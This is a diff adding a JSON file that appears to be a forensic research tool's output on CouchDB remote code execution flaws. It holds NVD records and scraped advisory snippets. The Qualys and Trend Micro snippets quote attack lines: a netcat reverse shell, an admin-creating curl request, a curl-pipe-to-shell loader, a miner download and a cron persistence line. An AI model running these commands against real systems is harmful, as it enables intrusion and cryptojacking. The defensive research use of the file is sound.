@@ -1,0 +1,106 @@
+{
+  "status": "Valid",
+  "query": "CouchDB Remote Command Execution vulnerability",
+  "tool_name": "search_forensic_evidence",
+  "retrieved_at_utc": "2026-10-26T01:36:18.694109+00:00",
+  "sources": [
+    {
+      "source_name": "NIST NVD",
+      "title": "CVE-2017-12636: NVD vulnerability record",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-12636",
+      "snippet": "CouchDB administrative users can configure the database server via HTTP(S). Some of the configuration options include paths for operating system-level binaries that are subsequently launched by CouchDB. This allows an admin user in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to execute arbitrary shell commands as the CouchDB user, including downloading and executing scripts from the public internet.",
+      "source_type": "nvd_cve_candidate",
+      "supports": [
+        "NVD lists CVE-2017-12636 as a research lead; product identity, version applicability, and exploitation remain unverified."
+      ],
+      "contradicts": [],
+      "retrieved_at_utc": "2026-10-26T01:36:18.694109+00:00"
+    },
+    {
+      "source_name": "NIST NVD",
+      "title": "CVE-2017-12635: NVD vulnerability record",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-12635",
+      "snippet": "Due to differences in the Erlang-based JSON parser and JavaScript-based JSON parser, it is possible in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to submit _users documents with duplicate keys for 'roles' used for access control within the database, including the special case '_admin' role, that denotes administrative users. In combination with CVE-2017-12636 (Remote Code Execution), this can be used to give non-admin users access to arbitrary shell commands on the server as the database system user. The JSON parser differences result in behaviour that if two 'roles' keys are available in the JSON, the second one will be used for authorising the document write, but the first 'roles' key is used for subsequent authorization for the newly created user. By design, users can not assign themselves roles. The vulnerability allows non-admin users to give themselves admin privileges.",
+      "source_type": "nvd_cve_candidate",
+      "supports": [
+        "NVD lists CVE-2017-12635 as a research lead; product identity, version applicability, and exploitation remain unverified."
+      ],
+      "contradicts": [],
+      "retrieved_at_utc": "2026-10-26T01:36:18.694109+00:00"
+    },
+    {
+      "source_name": "NIST NVD",
+      "title": "CVE-2018-11769: NVD vulnerability record",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-11769",
+      "snippet": "CouchDB administrative users before 2.2.0 can configure the database server via HTTP(S). Due to insufficient validation of administrator-supplied configuration settings via the HTTP API, it is possible for a CouchDB administrator user to escalate their privileges to that of the operating system's user under which CouchDB runs, by bypassing the blacklist of configuration settings that are not allowed to be modified via the HTTP API. This privilege escalation effectively allows a CouchDB admin user to gain arbitrary remote code execution, bypassing CVE-2017-12636 and CVE-2018-8007.",
+      "source_type": "nvd_cve_candidate",
+      "supports": [
+        "NVD lists CVE-2018-11769 as a research lead; product identity, version applicability, and exploitation remain unverified."
+      ],
+      "contradicts": [],
+      "retrieved_at_utc": "2026-10-26T01:36:18.694109+00:00"
+    },
+    {
+      "source_name": "NIST NVD",
+      "title": "CVE-2018-8007: NVD vulnerability record",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-8007",
+      "snippet": "Apache CouchDB administrative users can configure the database server via HTTP(S). Due to insufficient validation of administrator-supplied configuration settings via the HTTP API, it is possible for a CouchDB administrator user to escalate their privileges to that of the operating system's user that CouchDB runs under, by bypassing the blacklist of configuration settings that are not allowed to be modified via the HTTP API. This privilege escalation effectively allows an existing CouchDB admin user to gain arbitrary remote code execution, bypassing already disclosed CVE-2017-12636. Mitigation: All users should upgrade to CouchDB releases 1.7.2 or 2.1.2.",
+      "source_type": "nvd_cve_candidate",
+      "supports": [
+        "NVD lists CVE-2018-8007 as a research lead; product identity, version applicability, and exploitation remain unverified."
+      ],
+      "contradicts": [],
+      "retrieved_at_utc": "2026-10-26T01:36:18.694109+00:00"
+    },
+    {
+      "source_name": "Serper web result",
+      "title": "CouchDB Remote Code Execution Vulnerability",
+      "url": "https://threatprotect.qualys.com/2018/02/20/couchdb-remote-code-execution-vulnerability/",
+      "snippet": "UNTRUSTED WEB RESEARCH (not PCAP evidence). The vulnerability allows non-admin users to assign admin privileges to themselves. The affected versions are Apache CouchDB before 1.7.0 and 2.x ... | Webpage text: CouchDB is an open source non-SQL database designed for easy data replication. It uses Couch replication protocol to implement its replication functionality. CouchDB is implemented in Erlang. Two vulnerabilities CVE-2017-12635, CVE-2017-12636 were reported in CouchDB, they can exploited by attackers to achieve remote code execution with admin privileges. CVE-2017-12635: Elevation of privilege The vulnerability allows non-admin users to assign admin privileges to themselves. The affected versions are Apache CouchDB before 1.7.0 and 2.x before 2.1.1. In CouchDB users are created by inserting a document into _users database. The document includes a list of ‘roles‘ and additional strings representing extra privileges. This request is sent as a serialized JSON object. CouchDB has to two JSON parsers, the nativ The issue occurs when the JSON object contains duplicate keys. Javascript parser accepts the last key value pair but the native parser accepts both values and retrieves the first key data for further request processing. So if a user create JSON object contains two different values for the key ‘roles’ it chooses the first entry for setting authorization for the new user. curl -X PUT 'http://<link or ip>:5984/_users/org.couchdb.user:attacker' In the request above there is a duplicate entry for key ‘roles‘. CouchDB will choose the first value “roles”: [“_admin”] and assign admin rights to new user ‘attacker’, the Javascript parser would see only “roles”: [] so validate_doc_update() will not trigger any exception. Users should not be able to grant themselves admin privileges. In conjuction with CVE-2017-12636 and attacker can achieve remote code/command exe CVE-2017-12636: Command Injection CouchDB support modifying configuration variables via HTTP(S). This operation is only accessible to admin users. Many of these settings are paths to executable binaries that executed by CouchDB. One of these config variables is query_servers located in local.ini. An attacker can set one of these variables, and have CouchDB execute said binary under the OS context. This vulnerability can be exploited by creating an ad There is a publicly available PoC that is capable of creating an admin user, modify the query_servers variable and execute a command. There are reports that these vulnerabilities are exploited by attackers to download and execute cryptocurrency miners for Monero. We create user ‘dragon1‘ with roles set to _admin. We will use this user to exploit CVE-2017-12636. Create User with _admin role Next we modify the query_server to include our own entry. The format for the entries is <LANGUAGE> = <PATH> <ARGS>. So we will add ‘cmd = nc -c /bin/sh 10.113.199.41 11000’ Creating a dummy database vultest3 Adding a document vul3 to database calling query_servers value to validate said document. In the request above we are calling the value by name ‘cmd’, this will execute netcat on the target machine which initiates a connection to the attackers IP address. Apache CouchDB has addresses these vulnerabilities in version 2.1.1 & 1.7.0/1.7.1. The code has been updated to imitate Javascript JSON parser by picking the last key, if duplicates exist keys exist. The attack vector for CVE 2017-12636 has",
+      "source_type": "web_research_lead",
+      "supports": [],
+      "contradicts": [],
+      "retrieved_at_utc": "2026-10-26T01:36:18.694109+00:00"
+    },
+    {
+      "source_name": "Serper web result",
+      "title": "Apache CouchDB Vulnerabilities Permit Monero Mining",
+      "url": "https://www.trendmicro.com/en_us/research/18/b/vulnerabilities-apache-couchdb-open-door-monero-miners.html",
+      "snippet": "UNTRUSTED WEB RESEARCH (not PCAP evidence). Based on data from worldwide sensors, we have observed a new attack that exploits two vulnerabilities in a popular database system to ... | Webpage text: Content has been added to your Folio Exploits & Vulnerabilities Apache CouchDB Vulnerabilities Permit Monero Mining Based on data from worldwide sensors, we have observed a new attack that exploits two vulnerabilities in a popular database system to deliver miners for the Monero cryptocurrency. Attacks abusing cryptocurrency miners have been on an upswing — in large part due to the growing popularity of digital currencies. Based on data from our sensors that we deployed worldwide, we have observed a new attack that exploits two vulnerabilities in a popular database system to deliver miners (detected by Trend Micro as HKTL_COINMINE.GE, HKTL_COINMINE.GP, and HKTL_COINMINE.GQ) for the Monero cryptocurrency. In The two vulnerabilities that we found being exploited are as follows: Apache CouchDB JSON Remote Privilege Escalation Vulnerability (CVE-2017-12635) Apache CouchDB _config Command Execution (CVE-2017-12636) Due to differences in CouchDB’s parsers, exploitation of these vulnerabilities can provide attackers with duplicate keys that allow them access control — including administrator rights — within the system. The attackers can then use these functions to execute arbitrary code. These vulnerabilities were patched back in November 2017. By default, CouchDB listens to port 5984/TCP. According to our sensors, the peak periods of malicious activity occurred in early February: Figure 1. Chart showing the detection of potential attacks; early February was when the peaks occurred Based on the packet traces below, CVE-2017-12635 is first exploited to configure a CouchDB account that has administrator abilities. Figure 2. Packet traces we found that show exploitation of CVE-2017-12635 The administrator account is then used for authentication to exploit the remote command execution vulnerability CVE-2017-12636: Figure 3. Exploitation of CVE-2017-12636 using the account with administrative rights In this scenario, the authorization dG9wa2VrMTEyOnRvcGtlazExMg== can be decoded using base64 to the following credentials: The string Y3VybCBodHRwOi8vOTQuMjUwLjI1My4xNzgvbG9nbzYuanBnfHNo can be decoded using base 64 to a one-liner: curl hxxp://94.250[.]253[.]178/logo6[.]jpg|sh This will download logo6.jpg, which is actually a Bourne shell script that does several actions. First, it secures the compromised device by killing possible competing mining activities to ensure that the malware is the only cryptocurrency miner in the system. Some examples include the following: It also downloads and executes the cryptomining executable and configuration: wget -O /var/tmp/vpz http://94[.]250[.]253[.]178/yam · nohup ./vpz -c x -M stratum+tcp://xim4:x@178[.]170[.]189[.]193:82 >/dev/null & Furthermore, it keeps persistence on the device by installing scheduled cron jobs echo \"* * * * * wget -q http://94[.]250[.]253[.]178/logo6[.]jpg -O - | sh\" >> /tmp/cron || true && crontab /tmp/cron Vulnerabilities as a Gateway to Cryptocurrency Mining Cryptocurrencies have taken center stage recently, as prices hit both highs and lows: Bitcoin peaked at US$20,000 in December 2017 and dropped below US$6,000 just over a month later. And they haven’t been gaining attention from mainstream media and users alone — cybercriminals have a",
+      "source_type": "web_research_lead",
+      "supports": [],
+      "contradicts": [],
+      "retrieved_at_utc": "2026-10-26T01:36:18.694109+00:00"
+    },
+    {
+      "source_name": "Serper web result",
+      "title": "CVE-2022-24706: Apache CouchDB Auth Bypass ...",
+      "url": "https://www.sentinelone.com/vulnerability-database/cve-2022-24706/",
+      "snippet": "UNTRUSTED WEB RESEARCH (not PCAP evidence). CVE-2022-24706 is an authentication bypass vulnerability in Apache CouchDB. Learn about its impact, affected versions, and mitigation ... | Webpage text: [PARTIAL WEBPAGE: only first 150000 bytes examined] Stopping PHP2SHELL: How SentinelOne Protects Customers From This Attack TechniqueRead More Vulnerability Database/CVE-2022-24706 CVE-2022-24706: Apache CouchDB Auth Bypass Vulnerability CVE-2022-24706 is an authentication bypass flaw in Apache CouchDB that allows attackers to gain admin privileges on improperly secured installations. This article covers technical details, affected versions, and mitigation. Published: February 18, 2026 CVE-2022-24706 Overview CVE-2022-24706 is a critical authentication bypass vulnerability affecting Apache CouchDB versions prior to 3.2.2. The vulnerability allows remote attackers to access an improperly secured default installation without authentication and gain administrative privileges. This flaw stems from insecure default configuration settings that, when exploited, can lead to complete system compromise through remote code execution Apache CouchDB is a popular open-source NoSQL document-oriented database that uses JSON for documents and JavaScript for MapReduce indexes. The vulnerability is particularly dangerous because it affects default installations that have not been hardened according to Apache's security recommendations, and many deployments may be exposed on the network without proper firewall protection. This vulnerability is listed in CISA's Known Exploited Vulnerabilities (KEV) catalog, indicating active exploitation in the wild. Attackers can gain full administrative access to CouchDB instances and execute arbitrary code on the underlying system. Apache CouchDB versions prior to 3.2.2 Apache CouchDB default installations without proper security hardening CouchDB deployments exposed without firewall protection April 26, 2022 - CVE-2022-24706 published to NVD October 28, 2025 - Last updated in NVD database Technical Details for CVE-2022-24706 This vulnerability exploits insecure default configuration in Apache CouchDB installations, specifically related to the Erlang distribution protocol used for cluster communication. CouchDB is built on Erlang/OTP, which uses a cookie-based authentication mechanism for inter-node communication. In default configurations, this Erlang cookie can be predictable or easily guessable, allowing attackers to establish unauthor Once an attacker successfully authenticates to the Erlang distribution port (typically port 4369 for EPMD and dynamically assigned ports for node communication), they can execute arbitrary Erlang code on the target system. This effectively grants full administrative privileges to the CouchDB instance and enables remote code execution on the underlying operating system. The vulnerability is classified under CWE-1188 (Initialization with Hard-Coded Network Resource Configuration Default), reflecting the core issue of insecure default settings that expose the system to attack. The root cause of CVE-2022-24706 lies in CouchDB's default configuration that does not adequately secure the Erlang distribution mechanism used for clustering. By default, CouchDB installations may use a predictable Erlang cookie value, and the Erlang Port Mapper Daemon (EPMD) may be accessible from the network. When these conditions are present, attackers can connect",
+      "source_type": "web_research_lead",
+      "supports": [],
+      "contradicts": [],
+      "retrieved_at_utc": "2026-10-26T01:36:18.694109+00:00"
+    },
+    {
+      "source_name": "Serper web result",
+      "title": "2. Security Issues / CVEs — Apache CouchDB® 3.5 ...",
+      "url": "https://docs.couchdb.org/en/stable/cve/index.html",
+      "snippet": "UNTRUSTED WEB RESEARCH (not PCAP evidence). In the event of a CVE, the Apache CouchDB project will publish a fix as a patch to the current release series and its immediate predecessor only (e.g, if the ... | Webpage text: 2. Security Issues / CVEs 2. Security Issues / CVEs In the event of a CVE, the Apache CouchDB project will publish a fix as a patch to the current release series and its immediate predecessor only (e.g, if the current release is 3.3.3 and the predecessor is 3.2.3, we would publish a 3.3.4 release and a 3.2.4 release). Further backports may be published at our discretion. 2.1. CVE-2010-0009: Apache CouchDB Timing Attack Vulnerability 2.2. CVE-2010-2234: Apache CouchDB Cross Site Request Forgery Attack 2.3. CVE-2010-3854: Apache CouchDB Cross Site Scripting Issue 2.4. CVE-2012-5641: Information disclosure via unescaped backslashes in URLs on Windows 2.5. CVE-2012-5649: JSONP arbitrary code execution with Adobe Flash 2.6. CVE-2012-5650: DOM based Cross-Site Scripting via Futon UI 2.7. CVE-2014-2668: DoS (CPU and memory consumption) via the count parameter to /_uuids 2.8. CVE-2017-12635: Apache CouchDB Remote Privilege Escalation 2.9. CVE-2017-12636: Apache CouchDB Remote Code Execution 2.10. CVE-2018-11769: Apache CouchDB Remote Code Execution 2.11. CVE-2018-17188: Apache CouchDB Remote Privilege Escalations 2.12. CVE-2018-8007: Apache CouchDB Remote Code Execution 2.13. CVE-2020-1955: Apache CouchDB Remote Privilege Escalation 2.14. CVE-2021-38295: Apache CouchDB Privilege Escalation 2.15. CVE-2022-24706: Apache CouchDB Remote Privilege Escalation 2.16. CVE-2023-26268: Apache CouchDB: Information sharing via couchjs processes 2.17. CVE-2023-45725: Apache CouchDB: Privilege Escalation Using Design Documents 2.18. CVE-2026-86471: Admin credentials leading to code execution as operating system user 2.19. CVE-2026-90797: Pre-authentication gzip decompression bomb via POST /_session 2.20. CVE-2026-90798: Replicator follows redirects indefinitely 2.21. CVE-2026-90799: Atom-table exhaustion in _changes sequences and _search bookmarks with specially crafted sequence values 2.22. CVE-2026-90800: Auth bypass in prefixed Apache CouchDB _users and 2.23. CVE-2026-107755: Credential Disclosure via Object-Form Replication URLs 3. Reporting New Security Problems with Apache CouchDB The Apache Software Foundation takes a very active stance in eliminating security problems and denial of service attacks against Apache CouchDB. We strongly encourage folks to report such problems to our private security mailing list first, before disclosing them in a public forum. Please note that the security mailing list should only be used for reporting undisclosed security vulnerabilities in Apache CouchDB and managing the process of fixing such vulnerabilities. We cannot accept regular bug reports or other queries at this address. All mail sent to this address that does not relate to an undisclosed security problem in the Apache CouchDB source code If you need to report a bug that isn’t an undisclosed security vulnerability, please use the bug reporting page. How to configure CouchDB securely If a vulnerability applies to your particular application Obtaining further information on a published vulnerability Availability of patches and/or new releases should be address to the users mailing list. Please see the mailing lists page for details of how to subscribe. The private security mailing address",
+      "source_type": "web_research_lead",
+      "supports": [],
+      "contradicts": [],
+      "retrieved_at_utc": "2026-10-26T01:36:18.694109+00:00"
+    }
+  ],
+  "candidate_cves": [
+    "CVE-2017-12636",
+    "CVE-2017-12635",
+    "CVE-2018-11769",
+    "CVE-2018-8007"
+  ],
+  "retrieval_errors": [
+    "Webpage read unavailable for medium.com: HTTPError: HTTP Error 403: Forbidden",
+    "Webpage read unavailable for www.exploit-db.com: URLError: <urlopen error [WinError 10054] An existing connection was forcibly closed by the remote host>"
+  ]
+}
